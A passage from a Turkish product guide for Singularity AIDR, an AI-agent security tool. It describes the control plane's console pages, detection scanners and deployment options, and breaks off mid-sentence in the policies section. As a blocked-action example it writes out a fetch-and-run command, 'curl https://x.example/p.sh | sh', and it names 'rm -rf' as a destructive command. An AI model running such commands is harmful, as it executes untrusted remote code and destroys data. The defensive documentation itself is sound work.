# Singularity AIDR özellik rehberi, bölüm 3: kontrol düzlemi ve dağıtım

Singularity AIDR korumayı uç noktada uygular. Ajan bağlayıcıları (connector) ve Browser
Guard `allow`, `ask` ya da `deny` kararını yerelde verir; bunun için hesap veya ağ
bağlantısı gerekmez. **Kontrol düzlemi** (control plane) bunun üzerine eklenen, isteğe
bağlı bir yönetim katmanıdır. Web konsolu, kimlik ve roller, imzalı kayıt (enrollment),
merkezi politika, telemetri, denetim dışa aktarımı ve kaç uç noktanın raporlama
yapabileceğini belirleyen plan ve lisans kayıtlarını sağlar. Bu bölüm kontrol düzleminin
tüm özelliklerini ve her dağıtım seçeneğini anlatır: SaaS, müşterinin işlettiği Docker
Compose veya Kubernetes kurulumu ve air-gapped (internetten yalıtılmış) kurulum.

> **Sürüm durumu.** [first-customer-ready.md](../../../production-readiness/first-customer-ready.md)
> içindeki ilk müşteri kararı bugün **NO-GO**. Barındırılan (hosted) hizmet henüz müşteri
> kullanımı için kabul edilmedi. Her self-hosted kurulumun da kendi provası ve kabulü
> gerekir. Bu rehber yazılımın ne yaptığını ve nasıl işletileceğini anlatır;
> erişilebilirlik, SLA veya desteklenen bir satış taahhüdü vermez. Fiyatlar liste
> fiyatıdır ve COM-001 onayına tabidir.

## İçindekiler

1. [Kontrol düzleminin yeri](#1-kontrol-düzleminin-yeri)
2. [Yönetim konsolu: rota haritası](#2-yönetim-konsolu-rota-haritası)
3. [Yönetim konsolu özellikleri](#3-yönetim-konsolu-özellikleri)
   - [Onboarding (Connect)](#onboarding-connect)
   - [Bağlayıcı indirme merkezi](#bağlayıcı-indirme-merkezi)
   - [Genel bakış paneli](#genel-bakış-paneli)
   - [Olaylar (Events)](#olaylar-events)
   - [Olası olaylar ve kanıt zinciri](#olası-olaylar-ve-kanıt-zinciri)
   - [Ajanlar ve ajan ayrıntısı](#ajanlar-ve-ajan-ayrıntısı)
   - [Keşif kapsamı (Discovery)](#keşif-kapsamı-discovery)
   - [Yapay Zekâ Güvenlik Duruşu (AI Security Posture)](#yapay-zekâ-güvenlik-duruşu-ai-security-posture)
   - [Ekip politikası ve çalışma zamanı politikası](#ekip-politikası-ve-çalışma-zamanı-politikası)
   - [Kademeli politika dağıtımı ve geri alma](#kademeli-politika-dağıtımı-ve-geri-alma)
   - [DLP politika düzenleyicisi](#dlp-politika-düzenleyicisi)
   - [Tarayıcı gizliliği (Browser Privacy)](#tarayıcı-gizliliği-browser-privacy)
   - [AutoSecOps görünümü ve müdahale playbook'ları](#autosecops-görünümü-ve-müdahale-playbookları)
   - [API anahtarları ve kayıt belirteçleri](#api-anahtarları-ve-kayıt-belirteçleri)
   - [Ekip, roller ve davetler](#ekip-roller-ve-davetler)
   - [Çalışma alanı ayarları: ad, saklama süresi, kapatma](#çalışma-alanı-ayarları-ad-saklama-süresi-kapatma)
   - [Faturalama ve plan](#faturalama-ve-plan)
4. [Kimlik ve erişim](#4-kimlik-ve-erişim)
   - [Tek oturum açma: Microsoft Entra ID ve SAML 2.0](#tek-oturum-açma-microsoft-entra-id-ve-saml-20)
   - [SCIM dizin senkronizasyonu](#scim-dizin-senkronizasyonu)
   - [Çok faktörlü doğrulama, kurtarma ve oturum iptali](#çok-faktörlü-doğrulama-kurtarma-ve-oturum-iptali)
   - [Cihaz koduyla kayıt](#cihaz-koduyla-kayıt)
5. [Çok kiracılı yapı ve yalıtım](#5-çok-kiracılı-yapı-ve-yalıtım)
6. [Planlar, deneme ve kabul (admission)](#6-planlar-deneme-ve-kabul-admission)
   - [Plan kataloğu ve plan x özellik matrisi](#plan-kataloğu-ve-plan-x-özellik-matrisi)
   - [Deneme ve tenant kabulü](#deneme-ve-tenant-kabulü)
   - [Ödeme yolları: fatura ve kart](#ödeme-yolları-fatura-ve-kart)
   - [Operatör yönetimi (operator-admin)](#operatör-yönetimi-operator-admin)
7. [Telemetri ve telemetrinin gizliliği](#7-telemetri-ve-telemetrinin-gizliliği)
8. [Denetim dışa aktarımı ve SIEM teslimatı](#8-denetim-dışa-aktarımı-ve-siem-teslimatı)
   - [Denetim dışa aktarımı (CSV ve JSON)](#denetim-dışa-aktarımı-csv-ve-json)
   - [SIEM teslimatı](#siem-teslimatı)
   - [Uyum kanıt raporu](#uyum-kanıt-raporu)
   - [Alarm entegrasyonları: Slack, Teams, imzalı webhook ve e-posta](#alarm-entegrasyonları-slack-teams-imzalı-webhook-ve-e-posta)
9. [Saklama, yasal saklama ve offboarding](#9-saklama-yasal-saklama-ve-offboarding)
10. [Yedekleme ve geri yükleme tatbikatları](#10-yedekleme-ve-geri-yükleme-tatbikatları)
11. [Sistem gözlemi ve alarmlar](#11-sistem-gözlemi-ve-alarmlar)
12. [Dağıtım seçenekleri](#12-dağıtım-seçenekleri)
    - [Yerel mod (kontrol düzlemi olmadan)](#yerel-mod-kontrol-düzlemi-olmadan)
    - [Bulut (SaaS)](#bulut-saas)
    - [Docker Compose ile on-prem](#docker-compose-ile-on-prem)
    - [Helm ile Kubernetes](#helm-ile-kubernetes)
    - [Air-gapped kurulum](#air-gapped-kurulum)
    - [Çevrimdışı imzalı lisans](#çevrimdışı-imzalı-lisans)
    - [TLS seçenekleri](#tls-seçenekleri)
    - [Yükseltme ve geri alma](#yükseltme-ve-geri-alma)
    - [Kaynak boyutlandırma](#kaynak-boyutlandırma)
13. [Dağıtım x özellik matrisi](#13-dağıtım-x-özellik-matrisi)
14. [Bağlantılı belgeler](#14-bağlantılı-belgeler)

**Kapsam tablolarını okuma.** Plan sütunu `packages/dashboard/src/billing/plans.ts`
içindeki plan kataloğunu (`public.plans` tablosunun aynası) izler. Bu katalog ticari bir
listedir. Yazılım bugün yalnızca tenant'ın kabul edilmiş **ajan kapasitesini** uygular;
özellikleri plana göre tek tek açıp kapatmaz. Yani plan sütunu teknik bir kilidi değil,
o planla neyin satıldığını gösterir. "Yerel", kontrol düzlemi olmayan bir uç nokta
demektir. "Bulut" SaaS seçeneğidir. "On-prem" hem Docker Compose hem Kubernetes
kurulumunu kapsar. "Air-gapped" ise internet erişimi olmayan on-prem kurulumdur.

---

## 1. Kontrol düzleminin yeri

```
 Uç nokta (geliştirici makinesi, tarayıcı)         Kontrol düzlemi (bulut veya müşteri işletimli)
 +----------------------------------+              +----------------------------------------+
 | Bağlayıcı veya Browser Guard     |    kayıt     | Yönetim konsolu (web)                  |
 |  - yerel tespit ve politika      | <----------- | Edge Functions: enroll, policy, ingest,|
 |  - yerel denetim günlüğü         | imzalı polit.|   audit-export, scim, operator-admin   |
 |  - maskelenmiş olay / sayımlar ->| -----------> | Satır düzeyi güvenlikli Postgres       |
 +----------------------------------+              +----------------------------------------+
     kontrol düzlemine ulaşılamazsa imzalı önbellek durumuyla korumayı sürdürür
```

- **Karar sunucuya taşınmaz.** Bağlayıcılar her araç çağrısını uç noktada
  değerlendirir. Varsayılan yapılandırma `mode: "local"` şeklindedir.
- **Kontrol düzlemi yönetim ekler.** Kimlikler, roller, imzalı kayıt, merkezi çalışma
  zamanı ve DLP politikası, telemetri görünümleri, denetim dışa aktarımı, plan ve lisans
  kayıtları buradan gelir.
- **Her dağıtımda kod tabanı aynıdır.** Bulut, Compose ve Helm aynı 129 veritabanı
  migration dosyasını (`supabase/migrations/`) ve aynı Edge Functions kodunu
  (`supabase/functions/`) çalıştırır.
- **Çevrimdışı davranış.** Kayıtlı bir uç nokta, kontrol düzlemine ulaşamadığında imzalı
  önbellek durumuyla korumayı sürdürür. Yönetilen yetki (entitlement) kontrolleri
  `control_plane.grace_period_hours` değerini kullanır (varsayılan 72). Eğer
  `control_plane.remote_policy_required: true` ayarlanırsa, süresi dolmuş merkezi
  politika `control_plane.remote_policy_offline_grace_seconds` boyunca (varsayılan 3.600)
  kabul edilir. Bu süre bitince korunan işlemler politika yenilenene kadar
  **engellenir**. Bu, merkezi politikayı zorunlu tutan müşteriler için bilinçli bir
  "kapalı kalma" (fail-closed) tercihidir.

---

## 2. Yönetim konsolu: rota haritası

Konsol bir React uygulamasıdır (`packages/dashboard`). Oturum gerektiren her rota oturumu
kontrol eder; süresi dolmuşsa `/login` sayfasına yönlendirir. Boşta kalan oturum da
belirli bir hareketsizlik süresinden sonra tarayıcıda sonlanır. Rotalar
`packages/dashboard/src/main.tsx` içinde tanımlıdır:

| Rota | Menü etiketi | Ne için | Bölüm |
| --- | --- | --- | --- |
| `/onboarding` | Connect | Çalışma alanı oluşturma, deneme başlatma, çalışma zamanı seçimi, cihaz onayı | [Onboarding](#onboarding-connect) |
| `/downloads` | Downloads | SHA-256 özetiyle doğrulanmış bağlayıcı indirmeleri | [İndirme merkezi](#bağlayıcı-indirme-merkezi) |
| `/dashboard` | Dashboard | Filo sayaçları, canlı ajanlar, son olaylar | [Genel bakış](#genel-bakış-paneli) |
| `/billing` | Billing | Mevcut plan, kabul edilen ajanlar, plan değişikliği talebi, faturalar | [Faturalama](#faturalama-ve-plan) |
| `/api-keys` | API Keys | Tenant API anahtarları ve tek kullanımlık kayıt belirteçleri | [API anahtarları](#api-anahtarları-ve-kayıt-belirteçleri) |
| `/agents`, `/agents/:agentId` | Agents | Kayıtlı kurulumlar, koltuk kullanımı, ajan bazında olaylar | [Ajanlar](#ajanlar-ve-ajan-ayrıntısı) |
| `/events` | Events | Raporlanan son 500 karar olayı | [Olaylar](#olaylar-events) |
| `/discovery` | Discovery | Raporlanan AI altyapı toplayıcıları ve hedefleri | [Keşif](#keşif-kapsamı-discovery) |
| `/posture` | Posture | Altyapı CVE'leri, MCP riskleri, skill bulguları | [Yapay Zekâ Güvenlik Duruşu](#yapay-zekâ-güvenlik-duruşu-ai-security-posture) |
| `/incidents` | Incidents | Engellenen ve onay bekleyen kararlar, kanıt zinciri | [Olası olaylar](#olası-olaylar-ve-kanıt-zinciri) |
| `/privacy-guard` | Browser Privacy | Browser Guard sayımları ve tarayıcı kaydı | [Tarayıcı gizliliği](#tarayıcı-gizliliği-browser-privacy) |
| `/autosecops` | AutoSecOps | AutoSecOps entegrasyonundan çalışma zamanı filo görünümü | [AutoSecOps](#autosecops-görünümü-ve-müdahale-playbookları) |
| `/settings` | Settings | Çalışma alanı adı, saklama süresi, kapatma, alarm bildirimleri, MFA durumu, tema | [Ayarlar](#çalışma-alanı-ayarları-ad-saklama-süresi-kapatma), [Alarm entegrasyonları](#alarm-entegrasyonları-slack-teams-imzalı-webhook-ve-e-posta) |
| `/team` | Team | Üyeler, roller, davetler, ekip denetimi ve dışa aktarım | [Ekip](#ekip-roller-ve-davetler) |
| `/scim` | Directory provisioning (yalnızca sahipler) | SCIM kimlik bilgileri ve grup-rol eşlemeleri | [SCIM](#scim-dizin-senkronizasyonu) |
| `/policies` | Policies (politika düzenleyebilen roller) | Ekip politikası, çalışma zamanı politikası, dağıtım, DLP düzenleyicisi | [Politikalar](#ekip-politikası-ve-çalışma-zamanı-politikası) |
| `/compliance` | Compliance (sahipler ve yöneticiler) | Uyum kanıt raporu (özetle mühürlü, isteğe bağlı imzalı): JSON, CSV paketi, yazdırılabilir TR/EN | [Uyum kanıt raporu](#uyum-kanıt-raporu) |
| `/enterprise` | yok (davet bağlantısında) | Davet kabulü | [Ekip](#ekip-roller-ve-davetler) |
| `/auth/dlp-step-up` | yok | DLP ve çalışma alanı değişikliklerinden önce MFA doğrulaması | [MFA](#çok-faktörlü-doğrulama-kurtarma-ve-oturum-iptali) |
| `/auth/recover` | yok | Parola kurtarma ve acil durum (break-glass) kurtarma kodları | [MFA](#çok-faktörlü-doğrulama-kurtarma-ve-oturum-iptali) |

Oturum gerektirmeyen herkese açık sayfalar: `/` (tanıtım), `/pricing` (statik katalog
aynasından), `/pilot` (pilot başvurusu), `/verify` (cihaz kodu onayı), `/support`,
`/status`, `/privacy`, `/security`, `/terms` ve `/login`.

---

## 3. Yönetim konsolu özellikleri

### Onboarding (Connect)

**Ne yapar.** `/onboarding` yeni bir sahibi (owner) ilk korunan ajana kadar adım adım
götürür. Önce bir ekip çalışma alanı oluşturursunuz, sunuluyorsa 14 günlük denemeyi
başlatırsınız, ardından üç adımı tamamlarsınız: **1) Choose runtime**, **2) Download &
connect**, **3) Authorize**.

**Neden önemli.** Başarısız dağıtımların çoğu "kuruldu" ile "raporluyor" arasında takılır.
Bu sayfa doğru bağlayıcı indirmesini aynı ekibe ait cihaz koduyla eşleştirir. Böylece ilk
uç nokta imzalı bir yapılandırmayla doğru tenant'a yerleşir.

**Nasıl çalışır.** Sayfa çalışma alanının kabul (admission) durumunu okur. Buna göre ya
deneme teklifini (bulut kabul modu, owner rolü, kullanıcı başına bir deneme) ya da erişim
durumunu gösterir. Seçilen çalışma zamanına göre süzülmüş
[indirme merkezini](#bağlayıcı-indirme-merkezi) içerir. 3. adımda bir cihaz kodu
(`device-start`) veya manuel kayıt belirteci üretebilirsiniz. Ajan kaydedemeyen roller
için sayfa devre dışıdır.

**Nasıl kullanılır.**
1. Oturum açın ve **Connect** (`/onboarding`) sayfasını açın.
2. Henüz çalışma alanınız yoksa **Create your team workspace** altında bir ad girin.
3. Deneme sunuluyorsa, operatörün kaydettiği Kullanım Koşulları ve Gizlilik sürümlerini
   onaylayan kutuyu işaretleyin ve **Start 14-day trial · 1 agent** düğmesine basın.
4. Çalışma zamanını seçin, yükleyiciyi indirip doğrulayın ve kurun.
5. Ajan bir kod gösterdiğinde bunu `/verify` sayfasında onaylayın. Buradan kod üretmeniz
   yalnızca manuel bir kayıt belirtecine ihtiyaç duyarsanız gerekir.

**Örnek.** Bir sahip "Acme Platform" çalışma alanını oluşturur, denemeyi başlatır,
**Codex CLI**'ı seçip kurar ve ajanın gösterdiği kodu onaylar. Ajan `/agents` sayfasında
`codex` çalışma zamanıyla görünür.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar (katalog özelliği `dashboard`). Deneme yalnızca bulutta. | Bulut, On-prem, Air-gapped | Güncel bir tarayıcıda web konsolu; bağlayıcılar kendi rehberlerine göre |

**Sınırlamalar.** Deneme düğmesi yalnızca `cloud` kabul modunda, yalnızca sahiplere ve
daha önce deneme kullanmamış kullanıcılara görünür. Bağlayıcı kurulumu hâlâ çalışma
zamanına özgü bir adımdır; evrensel bir MDM yükleyicisi sunulmaz.

### Bağlayıcı indirme merkezi

**Ne yapar.** `/downloads`, yayımlanan sürümün bağlayıcı paketlerini listeler: Claude
Code, Cursor, VS Code, OpenClaw, OpenCode, Codex CLI, AIDR CLI, Chrome ve Edge için
Browser Guard, Firefox için Browser Guard ve MCP gateway. Her kayıtta dosya adı, boyut ve
SHA-256 özeti görünür. O çalışma zamanından bir ajan raporlama yaptığında çalışma zamanı
"algılandı" olarak işaretlenir.

**Neden önemli.** Kurcalanmış bir yükleyici, bir güvenlik ürününü daha çalışmaya
başlamadan etkisiz bırakabilir. Merkez yöneticilere tam özeti ve kopyalanabilir doğrulama
komutlarını verir; doğrulayamadığı hiçbir şeyi göstermez.

**Nasıl çalışır.** Konsol bir sürüm manifestini ya konsol sunucusundan
(`AIDR_RELEASE_MANIFEST_PATH`) ya da harici bir HTTPS adresinden
(`VITE_AIDR_RELEASE_MANIFEST_URL`) yükler. Manifest tarayıcıda da doğrulanır: `http:` bir
bağlantı, eksik bir özet, bilinmeyen bir alan veya 1 MiB'ı aşan bir manifest reddedilir.
Ayrık (detached) imza yayımlanmışsa ona bağlantı verilir.

**Nasıl kullanılır.** **Downloads** sayfasını açın, çalışma zamanını seçin, dosyayı
indirin ve **Verify the download before installing** altındaki komutu çalıştırın.
Doğrulama başarısızsa kurmayın.

**Örnek.** Firefox kaydı `SHA-256 3f…` gösterir. Yönetici listelenen `sha256sum`
komutunu çalıştırır, özetler eşleşir ve dosya tarayıcı politikasıyla dağıtılır. Manifest
adresi düz `http:` olsaydı sayfa "The release manifest URL is not an HTTPS or same-origin
address, so downloads are withheld." uyarısını gösterirdi.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped (manifest kendi konsol sunucunuzdan sunulur) | Web konsolu; bağlayıcıya göre Windows, macOS ve Linux indirmeleri |

**Sınırlamalar.** Özet, dosyanın manifestle bütünlüğünü kanıtlar; yayıncı kimliğini
kanıtlamaz. Noterleme (notarization), kod imzalama ve MDM kabulü harici adımlar olarak
kalır. Manifest yapılandırılmamışsa sayfa "No verified download is available for this
deployment." mesajını gösterir.

### Genel bakış paneli

**Ne yapar.** `/dashboard` oturum açıldıktan sonraki giriş sayfasıdır. Ajanlar, bağlı
ajanlar, bekleyen kayıt belirteçleri, olaylar, deny ve ask için sayaçlar gösterir. Ayrıca
en son görülen beş canlı ajanı ve son altı olayı listeler; yanında **Connect agent**,
**Verify code** ve **Privacy settings** kısayolları bulunur.

**Neden önemli.** Güvenlik sorumlusu, her ajanı tek tek açmadan uç noktaların raporlama
yapıp yapmadığını ve engellemelerin artıp artmadığını bir bakışta görmek ister.

**Nasıl çalışır.** Sayaçlar tenant'ın `agents` ve `events` satırlarını satır düzeyi
güvenlik (RLS) altında okur. Olay tabanlı sayaçlar son 500 olayı kapsar ve bu açıkça
belirtilir. "Latest heartbeat", herhangi bir ajanın en yeni `last_seen` zamanıdır.

**Nasıl kullanılır.** **Dashboard** sayfasını açın. Yeni uç nokta kaydetmek için
**Connect agent**, bir cihaz kodunu onaylamak için **Verify code** düğmesini kullanın.

**Örnek.** Bir politika değişikliğinden sonra son 500 olay içinde **Deny** kutucuğu
3'ten 41'e çıkar. İnceleyen kişi hangi aracın engellendiğini görmek için **Events**
sayfasını açar.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped | Web konsolu |

**Sınırlamalar.** Sayaçlar tam geçmişi değil, son 500 olayı yansıtır. `allow` kararları
yalnızca uç noktalar temiz kararları da gönderiyorsa
(`control_plane.send_clean_verdicts: true`) görünür.

### Olaylar (Events)

**Ne yapar.** `/events`, ekibin ajanlarından gelen son 500 olayı zaman, ajan, tür, karar
ve özet sütunlarıyla listeler. Rozetler deny, ask ve allow kararlarının toplamını
gösterir.

**Neden önemli.** Bir engellemenin beklenip beklenmediğini kontrol etmenin ilk yeri
burasıdır; örneğin yıkıcı bir `rm -rf` veya `sh`'ye yönlendirilmiş bir indirme.

**Nasıl çalışır.** Yönetilen moddaki uç noktalar maskelenmiş `runtime_verdict` olaylarını
`ingest` fonksiyonuna gönderir (bkz. [telemetri](#7-telemetri-ve-telemetrinin-gizliliği)).
Varsayılan raporlamada `ask` ve `deny` yüklenir; `allow` için temiz karar raporlaması
gerekir. Özetler yalnızca maskelemeden geçen alanları gösterir. Varsayılan
`redact_mode: "hash"` ile komut ve URL metni SHA-256 özetleriyle değiştirilir.

**Nasıl kullanılır.** **Events** sayfasını açıp **Refresh** düğmesine basın. `allow`
kararlarını da toplamak için uç nokta yapılandırmasında
`control_plane.send_clean_verdicts` değerini `true` yapın.

**Örnek.** Bir satır `dev-laptop-17` ajanı için `runtime_verdict` · `deny` ·
`Bash: deny` gösterir. Uç nokta komut metnini özetlediği için metnin kendisi görünmez.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped | Web konsolu |

**Sınırlamalar.** Sayfa 500 olayı kapsar. Daha uzun geçmiş için
[denetim dışa aktarımını](#8-denetim-dışa-aktarımı-ve-siem-teslimatı) veya SIEM
teslimatını kullanın. Olayların görünmesi uç noktaların raporlama ayarlarına bağlıdır.

### Olası olaylar ve kanıt zinciri

**Ne yapar.** `/incidents`, alınan engelleme (`deny`) ve onay gerektiren (`ask`)
kararlardan ve eklenti tarama bulgularından türetilen olası güvenlik olaylarını gösterir.
Listenin altındaki **Evidence chain** kayıtları ajana ve korelasyon kimliğine göre
gruplar. Böylece geri alma adımı dahil çok adımlı bir müdahale sırasıyla okunur.

**Neden önemli.** Bir soruşturmada düz bir günlük değil, tek bir cihazda olanların sırası
gerekir. Kanıtın bağımsız bir saklama alanına çıkıp çıkmadığını da bilmeniz gerekir.

**Nasıl çalışır.** Sayfa `incident_events` görünümünü ve son olayları okur. Kanıt
görünümü kayıtları ana makine saatine göre değil, cihaz başına tutulan mantıksal sayaca
göre sıralar. Hiçbir kaydın bildirmediği saat kayması "senkron" değil, *not reported*
olarak gösterilir. Bir zincir başı ancak bir arşiv o özet için kanıt döndürdüğünde
`anchored` sayılır. Arşiv hedefi (archive sink) yapılandırılmamışsa `unanchored`
(`no_archive_sink`) yazar.

**Nasıl kullanılır.** **Incidents** sayfasını açın, engellenen ve onay bekleyen sayıları
inceleyin, soruşturduğunuz cihaz ve korelasyon kimliğinin kanıt grubunu genişletin.
`ask` onayları konsoldan veya ajandan değil, operatör CLI'ı (`aidr pending`,
`aidr approve <actionId>`) ile bant dışında verilir.

**Örnek.** Bir ajan `curl https://x.example/p.sh | sh` çalıştırmaya çalışır. Uç nokta
bunu engelleyip `deny` raporlar. Liste "1 blocked" gösterir; kanıt zinciri cihaz
sayacıyla birlikte karar kaydını ve "unanchored" durumunu gösterir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped | Web konsolu |

**Sınırlamalar.** Sayılar yerel olay geçmişinin tamamını değil, son 500 olayı kapsar.
Şemada henüz tenant'a özgü bir olay kaydı tablosu yoktur; olaylar telemetriden türetilir.
Arşiv hedefi yapılandırılmadıkça kanıtlar yalnızca yerel kayıt olarak saklanır.

### Ajanlar ve ajan ayrıntısı

**Ne yapar.** `/agents` bilinen her kurulumu (benzersiz kurulum kimliği, `iid`) ad,
çalışma zamanı, sürüm ve son görülme zamanıyla listeler; izin verilen ve kaydedilen ajan
sayısını da gösterir. `/agents/:agentId` tek bir ajanı yetki anlık görüntüsüyle (katman,
izin verilen ajan sayısı, bitiş) ve son olaylarıyla gösterir.

**Neden önemli.** Koltuklar ajan başına sayılır. Yöneticiler hangi kurulumların kapasite
kullandığını, hangilerinin sessizleştiğini ve bir uç noktanın güncel bir yetkisi olup
olmadığını görmelidir.

**Nasıl çalışır.** Satırlar `agents` tablosundan ve `seat_usage` görünümünden RLS altında
gelir. Koltuk kullanımı okunamazsa sayfa bunu açıkça söyler; sınırı tahmin etmez.
Browser Guard çalıştıran bir tarayıcı profili de diğer bağlayıcılar gibi bir ajan koltuğu
sayılır.

**Nasıl kullanılır.** **Agents** sayfasını açın; ayrıntı ve olaylar için satırdaki
**View** düğmesini kullanın. Yeni ajan eklemek için **Onboarding** sayfasına gidin.

**Örnek.** "Allowed: 25. Recorded: 25." Ardından 26. uç nokta raporlama yapmaya çalışır
ve ingest'ten `402 agent_limit_exceeded` alır; olayları saklanmaz.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Tüm planlar | Bulut, On-prem, Air-gapped | Web konsolu |

**Sınırlamalar.** "Last seen" raporlanan bağlantıları yansıtır; ana makinenin korumayı
uyguladığının kanıtı değildir. Bunun için ana makineye özgü canary testleri kullanın.

### Keşif kapsamı (Discovery)

**Ne yapar.** `/discovery`, **raporlama yapan toplayıcılarınızın** AI altyapınızdan ne
gördüğünü özetler: toplayıcı ve hedef sayıları, güncelliğini yitirmiş (stale) toplayıcı ve hedefler, ulaşılamayan
ve hiç görülmemiş hedefler, kısmi ve raporlamayan toplayıcılar. Toplayıcı bazında hedef
tazeliğini, erişilebilirliği ve alarm durumunu listeler.

**Neden önemli.** Kendi barındırdığınız çıkarım sunucuları ve AI uygulamaları (Ollama,
vLLM, ComfyUI, Gradio ve benzerleri) hızla çoğalır ve çoğu zaman yamasız kalır. Hangilerinin
izlendiğini ve izlemenin durup durmadığını bilmeniz gerekir.

**Nasıl çalışır.** AIDR CLI `aidr collect` komutunu zamanlanmış olarak çalıştırır ve keşif
döngülerini `discovery` fonksiyonuna gönderir. Her döngüde bir sıra numarası, güncellik
süresi ve sınırlı bir hedef listesi (1-100 beklenen hedef) bulunur. Toplayıcı kimlik
bilgisini AAL2 oturumundaki bir owner veya admin `discovery` fonksiyonuyla
(`issue_credential`) üretir; varsayılan geçerlilik 30 gün, en fazla 90 gündür.

**Nasıl kullanılır.**
```sh
export AIDR_DISCOVERY_URL=https://api.aidr.example.com/functions/v1/discovery
export AIDR_DISCOVERY_ANON_KEY=<proje anon anahtarı>
export AIDR_DISCOVERY_COLLECTOR_CREDENTIAL=<toplayıcı kimlik bilgisi>
aidr collect --tenant <tenant-uuid> --file targets.txt --interval 900 --stale-after 15
```
`--allow-public` verilmedikçe hedefler loopback ve özel adreslerle sınırlıdır.

**Örnek.** Bir toplayıcı sekiz hedef raporlar. Biri yanıt vermeyi bırakır; 15 dakika sonra
güncelliğini yitirmiş ve ulaşılamaz olarak işaretlenir ve sayfadaki alarm durumu değişir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Ayrı bir katalog kalemi değil; konsolla birlikte gösterilir | Bulut, On-prem, Air-gapped | Windows, macOS veya Linux'ta AIDR CLI; web konsolu |

**Sınırlamalar.** Sayfanın kendisi de belirtir: yalnızca raporlama yapan toplayıcıları
kapsar; bulutunuzun, MDM'inizin veya tüm varlıklarınızın eksiksiz keşfi anlamına gelmez.
Yalnızca `local` sağlayıcısı uygulanmıştır; bulut ve MDM sağlayıcıları bir adaptör
gerektirir.

### Yapay Zekâ Güvenlik Duruşu (AI Security Posture)

**Ne yapar.** `/posture` son 90 gün için üç soruya yanıt verir. Hangi AI altyapısında
bilinen zafiyet var? Hangi MCP sunucuları yapılandırılmış ve ne kadar riskli? Hangi skill
veya eklenti paketlerinde tehlikeli kalıplar var? Kritik CVE, yüksek CVE, MCP sunucusu ve
skill bulgusu kutucuklarının ardından **Infrastructure exposure**, **MCP inventory
risks**, **Skill and plugin findings** tablolarını ve 30 günlük **Trend** tablosunu
gösterir.

**Neden önemli.** Bir ajan, konuştuğu sunucular ve araçlar kadar güvenlidir. Bilinen
CVE'si olan açıkta bir çıkarım sunucusu veya kabuk (shell) saran bir MCP sunucusu,
prompt injection'a uğramış bir ajanın erişebileceği alanı genişletir.

**Nasıl çalışır.** AIDR CLI'ya yerleşik, AIDR ile birlikte gelen zafiyet ve parmak izi
veri kümesine dayanan üç yerel ve deterministik tarayıcı vardır:

| Tarayıcı | Komut | Arkasındaki veri (bu depoda sayıldı) |
| --- | --- | --- |
| Altyapı açıklığı | `aidr scan --target <url>` veya `--file targets.txt` | 146 yapay zekâ bileşeni parmak izi (çıkarım sunucuları, ajan çatıları, AI uygulamaları); 116 bileşen için 2.014 CVE kural dosyası, 127 ürün genelinde 2.017 bildirim kaydına derlenmiş; her kayıt önem derecesi ve yayımlanmışsa CVSS puanı taşır |
| MCP envanteri | `aidr discover [--config <yol>...]` | Yerel MCP yapılandırma dosyaları ve 14 MCP risk kategorisi (`mcp-01`-`mcp-14`; örneğin token sızıntısı, araç zehirleme, komut enjeksiyonu ve araç gölgeleme) |
| Skill ve eklenti paketleri | `aidr scan --skill <dizin>` ve her oturum başı eklenti taraması | T01-T09 sınıflandırması için `threats/skill-scan.yaml` içinde 26 deterministik kural |

`--upload` ile bulgular kurulumun kayıtlı API anahtarıyla ingest'e gider. Bir veritabanı
tetikleyicisi bunları `public.posture_findings` tablosuna yansıtır. Makineden yalnızca
tanımlayıcılar, önem dereceleri, bileşen sürümleri ve özetler çıkar. Hedef URL'ler, ana
makine adları, dosya yolları, eşleşen metin, MCP komutları, argümanlar ve kimlik
bilgileri asla çıkmaz. İsteğe bağlı derin taramalar, loopback üzerinde dinleyen ayrı bir
köprü hizmetinde, isteğe bağlı bir yan konteyner (sidecar) olarak çalışır (bkz.
[Compose](#docker-compose-ile-on-prem)).

**Nasıl kullanılır.**
```sh
aidr scan --target http://10.0.0.5:11434 --upload
aidr scan --skill ~/.claude/skills/my-skill --upload
aidr discover --upload
```
Kritik veya yüksek bulgular `2` çıkış koduyla biter; bu sayede taramayı CI'da
kullanabilirsiniz. Okunamayan yollar eksik kapsam sayılır ve `1` ile biter.

**Örnek.** `aidr scan --target http://10.0.0.5:11434 --upload` kritik bir bildirimi olan
bir Ollama sürümünü tanımlar. `/posture` sayfasında CVE, **Infrastructure exposure**
altında CVSS değeri, "confirmed" uygulanabilirliği ve "1 target" ile görünür. IP adresi
görünmez, çünkü yalnızca özeti gönderilmiştir.

**Kapsam.**

| Plan | Dağıtım | Platform / işletim sistemi |
| --- | --- | --- |
| Business, Enterprise (katalog özelliği `ai_security_posture`) | Bulut, On-prem, Air-gapped (iç hedefler taranır) | Windows, macOS veya Linux'ta AIDR CLI; web konsolu |

**Sınırlamalar.** Yalnızca tespit yapar; çalışma zamanı kararlarını değiştirmez. Kapsam,
derlenmiş parmak izi ve CVE veri kümesi ile erişilebilen ve tanımlanabilen hedeflerle
sınırlıdır. Ulaşılamayan bir hedef "temiz" değil, "not scanned" olarak raporlanır. MCP
keşfi yalnızca yerel yapılandırma dosyalarını okur. Skill kuralları deterministik
kalıplardır; LLM tabanlı bir inceleme aşaması yoktur. Boş bir sayfa ortamın temiz olduğu anlamına
gelmez; yalnızca henüz bir şey yüklenmediğini gösterir.

### Ekip politikası ve çalışma zamanı politikası

**Ne yapar.** `/policies`, kayıtlı ajanlar için kod olarak politikadır (policy as code).
**Security Policy Editor** katı YAML ekip politikası belgelerini doğrulayarak saklar.
**Runtime policy**, bağlayıcıların çektiği derlenmiş JSON denetimlerini yayımlar: artefakt
türüne göre varsayılan eylemler ile MCP sunucu ve araç listeleri.

**Neden önemli.** Yerel kurallar bilinen kötü davranışı yakalar. Merkezi politika ise
